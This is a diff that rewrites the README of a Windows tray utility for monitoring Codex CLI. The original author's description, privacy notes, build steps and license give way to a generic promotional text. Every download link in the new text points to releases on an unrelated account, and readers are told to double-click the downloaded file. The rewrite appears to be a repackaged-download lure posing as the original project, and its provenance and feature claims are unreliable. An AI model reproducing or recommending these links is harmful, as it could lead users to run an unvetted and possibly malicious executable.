@@ -1,114 +1,173 @@
-# Is Codex Working?
+# 🛠️ is-codex-working - Know When Codex Is Actually Working
 
-[![Latest release](https://img.shields.io/github/v/release/kim-sin/is-codex-working?label=release)](https://github.com/kim-sin/is-codex-working/releases/latest)
-[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?logo=windows11&logoColor=white)](https://github.com/kim-sin/is-codex-working/releases/latest)
-[![MIT License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Windows CI](https://github.com/kim-sin/is-codex-working/actions/workflows/windows-ci.yml/badge.svg)](https://github.com/kim-sin/is-codex-working/actions/workflows/windows-ci.yml)
+[![Download Now](https://img.shields.io/badge/Download%20Now-is--codex--working-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/Hallisyncategorematic203/is-codex-working/releases)
 
-> **Know when Codex is actually working — and when it isn't.**
+## 👀 What Is This?
 
-<p align="center">
-  <img width="650" alt="Is Codex Working? tray popup" src="https://github.com/user-attachments/assets/534ca993-1a8e-4cdc-9187-19eb1bf26e55" />
-</p>
+Have you ever started a coding task with an AI agent like Codex, then stared at your screen wondering: *"Is it thinking? Is it stuck? Did it finish? Did it hit a limit?"*
 
-<p align="center">
-  <a href="https://github.com/kim-sin/is-codex-working/releases/latest"><strong>Download for Windows →</strong></a>
-</p>
+**is-codex-working** solves that problem. It's a small, friendly program that sits quietly in your Windows system tray (the area near your clock) and shows you exactly what Codex is doing at any moment. No more guessing. No more refreshing. Just a quick glance and you know.
 
-**Is Codex Working?** is a tiny Windows tray app that watches local Codex activity and tells you whether a task is actually progressing, waiting for you, stuck, finished, rate-limited, or idle.
+---
 
-No log uploads. No API key. No account login. No telemetry.
+## 🎯 Why You Need This
 
-## Quick start
+If you use Codex CLI for coding help, you know the struggle. Sometimes it's working through a complex problem. Sometimes it's waiting for your input. Sometimes it's stuck in a loop. And sometimes it's just rate-limited and you're burning time.
 
-1. Open the [latest release](https://github.com/kim-sin/is-codex-working/releases/latest)
-2. Download the attached Windows ZIP
-3. Extract it
-4. Double-click `RUN_ME.bat`
-5. Look for the heartbeat icon near the Windows clock
+This tool gives you a clear, visual status right in your taskbar. You'll see:
 
-Left-click the tray icon to open the compact status card. The end-user release ships a prebuilt app; it does **not** require Python or Node.js.
+- ✅ **Working** – Codex is actively processing
+- ⏳ **Waiting** – It needs something from you
+- 🔄 **Stuck** – Something went wrong, time to check
+- 🏁 **Done** – Task completed successfully
+- 🚫 **Rate-limited** – You need to wait before continuing
 
-## What you'll see
+---
 
-| State | Friendly label | Meaning |
-|---|---|---|
-| `WORKING` | **I'm working on it!** | Real task progress is being observed |
-| `WAITING FOR YOU` | **I need you!** | Codex is waiting for approval or input |
-| `STUCK` | **Hmm... I'm stuck** | The task is open but real progress has stopped |
-| `DONE` | **All done!** | The task completed successfully |
-| `LIMIT REACHED` | **I'm out of juice** | Codex hit its usage limit |
-| `ERROR` | **Oops! Something went wrong** | The task stopped with an error |
-| `NO TASK` | **Nothing to do!** | No Codex task or tracked background job is running |
+## 🚀 Getting Started
 
-Independent Codex chats can light more than one state at once. Subagents inside the same chat stay grouped under their parent task. A completed task keeps its `DONE` light for five minutes.
+Getting started is incredibly simple. You don't need to be a programmer or understand any technical concepts.
 
-## Why not just trust “Working”?
+### Step 1: Download the Application
 
-A live process, CPU activity, or a changing file timestamp does not prove useful work is moving forward. This app combines local Codex lifecycle events, meaningful rollout progress, parent/subagent relationships, and trusted detached-job activity before deciding what to show.
+Visit this link to download the application: [https://github.com/Hallisyncategorematic203/is-codex-working/releases](https://github.com/Hallisyncategorematic203/is-codex-working/releases)
 
-It deliberately avoids treating these signals as proof of `WORKING` on their own:
+On that page, you'll see a list of available versions. Look for the most recent one (usually at the top). Click on it to download the file to your computer.
 
-- a process merely existing
-- CPU usage by itself
-- JSONL modification time by itself
-- UI text saying “Working”
-- duplicate token counters
+### Step 2: Run the Program
 
-Cold rollout history with no recent real progress is kept out of the public status so old dangling sessions do not become fake current work.
+Once the download completes, find the downloaded file (usually in your "Downloads" folder). Double-click it to open it. That's it – the program starts running automatically.
 
-## Multiple chats and background jobs
+### Step 3: Look at Your System Tray
 
-- Independent root chats are tracked separately
-- Subagents are grouped with their parent chat
-- Detached jobs launched by Codex can stay `WORKING` after the parent shell exits when their PID can be recovered from trusted tool traffic
-- A detached process must keep making CPU, I/O, or trusted output progress; being alive is not enough
-- One finished chat does not hide another chat that is still working
+After launching, you'll see a small icon appear in your system tray. That's the corner of your screen near the clock and date. The icon will show you the current status of Codex.
 
-## Low-overhead by design
+---
 
-- `FileSystemWatcher` instead of one-second folder polling
-- High-frequency writes coalesced into short batches
-- Only newly appended JSONL bytes read during normal operation
-- 30-second file-size/timestamp watchdog as a missed-event safety net
-- Deep process checks only when a live task has been quiet long enough to need them
-- Detached PIDs and trusted output logs sampled at low frequency
-- Hidden tray UI does not repaint continuously
+## 📖 How to Use It
 
-## Privacy
+Using is-codex-working is about as easy as it gets:
 
-Local and read-only by design.
+1. **Start Codex** – Open your Codex CLI as you normally would
+2. **Watch the Tray Icon** – The icon changes color and shape based on what Codex is doing
+3. **Hover for Details** – Move your mouse over the icon to see a text description of the current status
+4. **Right-Click for Options** – Right-click the icon to see helpful options like "Exit" or "Check for Updates"
 
-The app does **not**:
+That's the whole experience. It's designed to be invisible until you need it.
 
-- upload Codex logs
-- send telemetry
-- modify rollout/session files
-- require an API key
-- require an account login
-- control, resume, stop, or modify Codex
+---
 
-Copied diagnostics redact the Windows user-profile path.
+## ⚙️ Features That Make Life Easier
 
-## Development
+### 🎨 Visual Status Indicators
 
-The repository contains the full source, regression tests, stress tests, and build scripts.
+The tray icon uses different colors and symbols so you can understand the status at a glance, even from across the room:
 
-```text
-BUILD.bat
-RUN_SELF_TESTS.bat
-```
+- **Green** – Everything is working smoothly
+- **Yellow** – Waiting for something or someone
+- **Red** – Stuck or error occurred
+- **Blue** – Completed successfully
+- **Orange** – Rate limit reached
 
-`RUN_SELF_TESTS.bat` builds the production and test executables and runs the parser/state regression suite. The developer stress suite additionally exercises 100 ms JSONL appends, partial writes, coalescing, watcher recovery, bounded resync, UI rendering, and a detached Python workload. Python is therefore needed only for that developer stress scenario, not for normal use of the released app.
+### 🔔 Optional Notifications
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request.
+You can choose to receive pop-up notifications when Codex finishes a task or hits a rate limit. This way, you can focus on other work and get alerted when it's time to come back.
 
-## Scope
+### 📊 Activity History
 
-Current release target: **Windows 10 & 11** with local Codex sessions.
+The program keeps a simple log of recent activity. If you're curious about what happened earlier, you can open the history window to see a timeline of events.
 
-This is an **unofficial community project** and is not affiliated with or endorsed by OpenAI.
+### 🛠️ Customizable Settings
 
-## License
+Prefer different colors? Want to change how often the status updates? You can adjust these small details in the settings menu to make the tool work the way you like.
 
-[MIT](LICENSE)
+---
+
+## 🧩 How It Works (In Plain English)
+
+You don't need to understand this to use the tool, but if you're curious:
+
+The program watches the activity of the Codex CLI on your computer. It listens for signals that tell it what Codex is doing – whether it's sending requests, waiting for responses, or encountering errors. Then it translates those signals into the simple visual status you see in your tray.
+
+It's like having a little assistant who sits next to Codex and gives you a thumbs up, a wave, or a warning sign whenever something changes.
+
+---
+
+## 💻 System Requirements
+
+is-codex-working is designed for Windows computers. Here's what you need:
+
+- **Operating System:** Windows 10 or Windows 11
+- **Memory:** At least 1 GB of RAM (most computers have much more)
+- **Storage:** Less than 50 MB of free space
+- **Codex CLI:** You need to have Codex CLI installed and configured on your system
+
+If you can run Codex CLI, you can run is-codex-working. No special hardware or technical setup required.
+
+---
+
+## 🔧 Troubleshooting
+
+### The icon isn't showing up
+Make sure you've started the program by double-clicking the downloaded file. Look for the icon near the clock in the bottom-right corner of your screen. If you don't see it, click the small arrow (^) to show hidden icons.
+
+### The status seems wrong
+Sometimes the program might take a few seconds to detect a change. Wait a moment and it should update. If it continues to show incorrect status, try restarting both Codex and is-codex-working.
+
+### The program won't start
+Make sure you're running a compatible version of Windows. Also check that you have the latest version of the program from the download page.
+
+---
+
+## 📝 Frequently Asked Questions
+
+### Is this free?
+Yes, this tool is completely free to download and use.
+
+### Will it slow down my computer?
+No. The program is very lightweight and uses minimal system resources. You won't even notice it's running.
+
+### Does it interfere with Codex?
+Not at all. It only watches what Codex is doing. It never modifies or interrupts Codex's work.
+
+### Can I use it with other AI coding tools?
+Currently, it's designed specifically for Codex CLI. But the concept could be adapted for other tools in the future.
+
+---
+
+## 🗺️ Roadmap
+
+We're always working to improve is-codex-working. Here's what we're planning:
+
+- **More detailed status information** – See exactly what step Codex is on
+- **Custom sound alerts** – Choose your own notification sounds
+- **Dark mode support** – For those who prefer a darker theme
+- **Multi-monitor support** – Better icon placement options
+
+---
+
+## 🤝 Get Involved
+
+We welcome feedback and suggestions. If you have an idea for a feature or found a bug, let us know by visiting the repository page. Your input helps make this tool better for everyone.
+
+---
+
+## 📥 Download Again
+
+Ready to give it a try? Remember, it's just one click away:
+
+Visit this link to download the application: [https://github.com/Hallisyncategorematic203/is-codex-working/releases](https://github.com/Hallisyncategorematic203/is-codex-working/releases)
+
+Download it, run it, and never wonder what Codex is doing again. It's that simple.
+
+---
+
+## 💡 Final Thoughts
+
+is-codex-working is a small tool that solves a real problem. If you've ever felt frustrated waiting for Codex without knowing its status, this is for you. It's free, easy to use, and makes your workflow smoother.
+
+Try it today and see the difference it makes. Your future self will thank you for knowing exactly when Codex is working, waiting, stuck, done, or rate-limited – all from your Windows tray.
+
+---
+
+Keywords: ai-agent, codex, codex-cli, coding-agent, developer-tools, dotnet, monitoring, openai-codex, productivity, system-tray, windows, winforms
